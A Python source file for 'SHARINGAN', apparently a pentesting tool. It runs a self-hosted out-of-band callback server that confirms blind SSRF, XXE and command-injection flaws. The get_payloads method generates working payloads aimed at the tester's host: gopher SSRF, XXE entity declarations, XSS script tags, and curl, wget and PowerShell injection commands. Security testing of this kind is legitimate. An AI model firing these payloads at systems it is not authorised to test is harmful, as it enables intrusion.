# -*- coding: utf-8 -*-
"""
SHARINGAN - Out-of-Band (OOB) Detection Server
Self-hosted alternative to Burp Collaborator.

Provides HTTP/DNS callback detection for confirming:
- SSRF vulnerabilities
- XXE vulnerabilities
- RCE vulnerabilities
- Blind injection vulnerabilities
"""

import http.server
import socketserver
import threading
import uuid
import json
import time
import hashlib
import re
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
from queue import Queue
import socket


class CallbackType(Enum):
    """Types of OOB callbacks."""
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    SMTP = "smtp"


@dataclass
class OOBCallback:
    """Represents a received OOB callback."""
    callback_id: str
    callback_type: CallbackType
    timestamp: datetime
    source_ip: str
    source_port: int
    raw_data: str
    headers: Dict[str, str] = field(default_factory=dict)
    path: Optional[str] = None
    query: Optional[str] = None
    body: Optional[str] = None
    dns_query: Optional[str] = None


@dataclass
class OOBToken:
    """Represents an OOB detection token."""
    token_id: str
    created_at: datetime
    description: str
    vuln_type: str
    target_url: Optional[str] = None
    payload_sent: Optional[str] = None
    callbacks: List[OOBCallback] = field(default_factory=list)
    confirmed: bool = False


class OOBHTTPHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler for OOB callbacks."""

    server: 'OOBHTTPServer'

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

    def do_GET(self):
        """Handle GET request."""
        self._handle_request()

    def do_POST(self):
        """Handle POST request."""
        self._handle_request()

    def do_PUT(self):
        """Handle PUT request."""
        self._handle_request()

    def do_HEAD(self):
        """Handle HEAD request."""
        self._handle_request()

    def do_OPTIONS(self):
        """Handle OPTIONS request."""
        self._handle_request()

    def _handle_request(self):
        """Handle any HTTP request."""
        # Extract token from path
        path = self.path
        token_id = self._extract_token(path)

        # Get body if present
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8', errors='replace') if content_length > 0 else None

        # Parse query string
        query = None
        if '?' in path:
            path, query = path.split('?', 1)

        # Create callback record
        callback = OOBCallback(
            callback_id=str(uuid.uuid4())[:8],
            callback_type=CallbackType.HTTP,
            timestamp=datetime.now(),
            source_ip=self.client_address[0],
            source_port=self.client_address[1],
            raw_data=f"{self.command} {self.path}",
            headers=dict(self.headers),
            path=path,
            query=query,
            body=body,
        )

        # Notify server
        self.server.record_callback(token_id, callback)

        # Send response
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('X-Sharingan', 'OOB-Detected')
        self.end_headers()
        self.wfile.write(b"OK")

    def _extract_token(self, path: str) -> Optional[str]:
        """Extract token ID from request path."""
        # Pattern: /token/[TOKEN_ID] or /[TOKEN_ID]
        patterns = [
            r'/token/([a-f0-9]{16,32})',
            r'/([a-f0-9]{16,32})',
            r'\?.*token=([a-f0-9]{16,32})',
        ]

        for pattern in patterns:
            match = re.search(pattern, path, re.IGNORECASE)
            if match:
                return match.group(1)

        return None


class OOBHTTPServer(socketserver.TCPServer):
    """HTTP server for OOB detection."""

    allow_reuse_address = True

    def __init__(self, server_address, RequestHandlerClass, oob_server: 'OOBServer'):
        super().__init__(server_address, RequestHandlerClass)
        self.oob_server = oob_server

    def record_callback(self, token_id: Optional[str], callback: OOBCallback):
        """Record a callback with the main OOB server."""
        self.oob_server._record_callback(token_id, callback)


class OOBServer:
    """
    Out-of-Band Detection Server.

    Self-hosted callback server for confirming blind vulnerabilities.

    Features:
    - HTTP callback detection
    - Unique tokens per test
    - Real-time notifications
    - Callback history
    """

    def __init__(self, host: str = "0.0.0.0", http_port: int = 8888,
                 external_host: Optional[str] = None):
        """
        Initialize OOB server.

        Args:
            host: Bind address
            http_port: HTTP server port
            external_host: External hostname/IP (for payload generation)
        """
        self.host = host
        self.http_port = http_port
        self.external_host = external_host or self._get_external_ip()

        self.tokens: Dict[str, OOBToken] = {}
        self.callbacks: List[OOBCallback] = []
        self.callback_queue: Queue = Queue()

        self._http_server: Optional[OOBHTTPServer] = None
        self._http_thread: Optional[threading.Thread] = None
        self._running = False

        # Callback handlers
        self._on_callback: Optional[Callable[[OOBToken, OOBCallback], None]] = None

    def _get_external_ip(self) -> str:
        """Get external IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def start(self):
        """Start the OOB server."""
        if self._running:
            return

        self._running = True

        # Start HTTP server
        self._http_server = OOBHTTPServer(
            (self.host, self.http_port),
            OOBHTTPHandler,
            self
        )
        self._http_thread = threading.Thread(
            target=self._http_server.serve_forever,
            daemon=True
        )
        self._http_thread.start()

    def stop(self):
        """Stop the OOB server."""
        self._running = False

        if self._http_server:
            self._http_server.shutdown()
            self._http_server.server_close()

    def generate_token(self, description: str = "", vuln_type: str = "unknown",
                      target_url: Optional[str] = None) -> OOBToken:
        """
        Generate a unique OOB token.

        Args:
            description: Description of the test
            vuln_type: Type of vulnerability being tested
            target_url: Target URL being tested

        Returns:
            OOBToken with unique ID
        """
        # Generate unique token
        token_id = hashlib.md5(
            f"{uuid.uuid4()}{time.time()}".encode()
        ).hexdigest()[:24]

        token = OOBToken(
            token_id=token_id,
            created_at=datetime.now(),
            description=description,
            vuln_type=vuln_type,
            target_url=target_url,
        )

        self.tokens[token_id] = token
        return token

    def get_callback_url(self, token: OOBToken, path: str = "") -> str:
        """
        Get callback URL for a token.

        Args:
            token: OOB token
            path: Optional additional path

        Returns:
            Full callback URL
        """
        base = f"http://{self.external_host}:{self.http_port}"
        return f"{base}/token/{token.token_id}{path}"

    def get_payloads(self, token: OOBToken) -> Dict[str, str]:
        """
        Generate various payloads for OOB testing.

        Args:
            token: OOB token

        Returns:
            Dict of payload name to payload string
        """
        callback_url = self.get_callback_url(token)
        host = f"{self.external_host}:{self.http_port}"

        return {
            # Basic URL
            "url": callback_url,

            # SSRF payloads
            "ssrf_basic": callback_url,
            "ssrf_gopher": f"gopher://{host}/_GET%20/token/{token.token_id}%20HTTP/1.0%0d%0a",

            # XXE payloads
            "xxe_entity": f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]>',
            "xxe_param": f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}"> %xxe;]>',

            # XSS OOB
            "xss_img": f'<img src="{callback_url}">',
            "xss_script": f'<script src="{callback_url}"></script>',

            # Command injection
            "cmd_curl": f"curl {callback_url}",
            "cmd_wget": f"wget {callback_url}",
            "cmd_powershell": f"powershell -c \"Invoke-WebRequest -Uri '{callback_url}'\"",

            # DNS (if DNS server enabled)
            "dns_subdomain": f"{token.token_id}.{self.external_host}",
        }

    def check_callbacks(self, token: OOBToken) -> List[OOBCallback]:
        """
        Check for callbacks for a specific token.

        Args:
            token: OOB token to check

        Returns:
            List of callbacks received
        """
        return self.tokens.get(token.token_id, OOBToken("", datetime.now(), "", "")).callbacks

    def has_callback(self, token: OOBToken) -> bool:
        """Check if token has received any callbacks."""
        stored_token = self.tokens.get(token.token_id)
        if stored_token:
            return len(stored_token.callbacks) > 0
        return False

    def wait_for_callback(self, token: OOBToken, timeout: float = 30.0) -> Optional[OOBCallback]:
        """
        Wait for a callback with timeout.

        Args:
            token: OOB token
            timeout: Maximum wait time in seconds

        Returns:
            Callback if received, None if timeout
        """
        start_time = time.time()

        while time.time() - start_time < timeout:
            if self.has_callback(token):
                callbacks = self.check_callbacks(token)
                if callbacks:
                    return callbacks[-1]
            time.sleep(0.5)

        return None

    def _record_callback(self, token_id: Optional[str], callback: OOBCallback):
        """Record a callback internally."""
        self.callbacks.append(callback)

        # Associate with token if found
        if token_id and token_id in self.tokens:
            token = self.tokens[token_id]
            token.callbacks.append(callback)
            token.confirmed = True

            # Trigger callback handler
            if self._on_callback:
                self._on_callback(token, callback)

    def on_callback(self, handler: Callable[[OOBToken, OOBCallback], None]):
        """
        Set callback handler for real-time notifications.

        Args:
            handler: Function to call when callback received
        """
        self._on_callback = handler

    def get_summary(self) -> Dict[str, Any]:
        """Get OOB server summary."""
        confirmed_tokens = [t for t in self.tokens.values() if t.confirmed]

        return {
            "total_tokens": len(self.tokens),
            "confirmed_tokens": len(confirmed_tokens),
            "total_callbacks": len(self.callbacks),
            "callbacks_by_type": {
                ct.value: len([c for c in self.callbacks if c.callback_type == ct])
                for ct in CallbackType
            },
            "server_url": f"http://{self.external_host}:{self.http_port}",
        }

    def to_json(self) -> str:
        """Export results to JSON."""
        return json.dumps({
            "tokens": [
                {
                    "token_id": t.token_id,
                    "description": t.description,
                    "vuln_type": t.vuln_type,
                    "target_url": t.target_url,
                    "confirmed": t.confirmed,
                    "callbacks_count": len(t.callbacks),
                    "callbacks": [
                        {
                            "type": c.callback_type.value,
                            "timestamp": c.timestamp.isoformat(),
                            "source_ip": c.source_ip,
                            "path": c.path,
                        }
                        for c in t.callbacks
                    ]
                }
                for t in self.tokens.values()
            ],
            "summary": self.get_summary(),
        }, indent=2)


class OOBTester:
    """
    Convenience class for OOB testing workflows.
    """

    def __init__(self, server: OOBServer):
        self.server = server
        self.results: List[Dict[str, Any]] = []

    def test_ssrf(self, target_url: str, inject_param: str,
                  callback_timeout: float = 10.0) -> Dict[str, Any]:
        """
        Test for SSRF vulnerability.

        Args:
            target_url: URL to test
            inject_param: Parameter to inject callback URL
            callback_timeout: Time to wait for callback

        Returns:
            Test result dict
        """
        token = self.server.generate_token(
            description=f"SSRF test on {target_url}",
            vuln_type="ssrf",
            target_url=target_url
        )

        payloads = self.server.get_payloads(token)
        callback_url = payloads["ssrf_basic"]

        result = {
            "vuln_type": "ssrf",
            "target_url": target_url,
            "inject_param": inject_param,
            "token_id": token.token_id,
            "callback_url": callback_url,
            "vulnerable": False,
            "callback_received": None,
        }

        # Store payload sent
        token.payload_sent = callback_url

        # Wait for callback
        callback = self.server.wait_for_callback(token, callback_timeout)

        if callback:
            result["vulnerable"] = True
            result["callback_received"] = {
                "timestamp": callback.timestamp.isoformat(),
                "source_ip": callback.source_ip,
                "path": callback.path,
            }

        self.results.append(result)
        return result

    def test_xxe(self, target_url: str,
                 callback_timeout: float = 10.0) -> Dict[str, Any]:
        """
        Generate XXE payloads for testing.

        Args:
            target_url: URL to test
            callback_timeout: Time to wait for callback

        Returns:
            Test setup with payloads
        """
        token = self.server.generate_token(
            description=f"XXE test on {target_url}",
            vuln_type="xxe",
            target_url=target_url
        )

        payloads = self.server.get_payloads(token)

        return {
            "vuln_type": "xxe",
            "target_url": target_url,
            "token_id": token.token_id,
            "payloads": {
                "entity": payloads["xxe_entity"],
                "param_entity": payloads["xxe_param"],
            },
            "check_url": self.server.get_callback_url(token),
        }
